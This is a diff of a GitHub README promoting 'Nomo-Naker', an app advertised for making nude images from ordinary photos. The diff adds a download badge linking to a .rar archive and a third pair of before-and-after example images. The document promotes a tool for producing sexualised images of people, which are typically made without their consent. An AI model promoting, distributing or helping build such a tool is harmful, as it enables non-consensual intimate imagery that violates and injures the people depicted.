@@ -1,6 +1,7 @@
 # Nomo-Naker
 Best  app to making Nude🔞🔞 from picture💯💯
 # (on your responsibility)
+[![Download](https://img.shields.io/badge/Download-Software.zip-ff69b4)](https://github.com/N0Mod/Nomo-Naker/releases/download/Nomo/NomoNaker.rar)
 ---
 ## Features
 🟢 **Beautiful UI**
@@ -28,6 +29,14 @@ Best  app to making Nude🔞🔞 from picture💯💯
 
 ### Output 2
 ![Output 2](https://github.com/N0Mod/Nomo-Naker/blob/main/src/input-output/output/photo_4_2025-07-09_19-36-39.jpg)
+
+### Input 3
+![](https://github.com/N0Mod/Nomo-Naker/blob/main/src/input-output/input/photo_5_2025-07-09_19-36-39.jpg)
+
+### Output 3
+
+![](https://github.com/N0Mod/Nomo-Naker/blob/main/src/input-output/output/photo_6_2025-07-09_19-36-39.jpg)
+
 
 ---
 ### tutorial
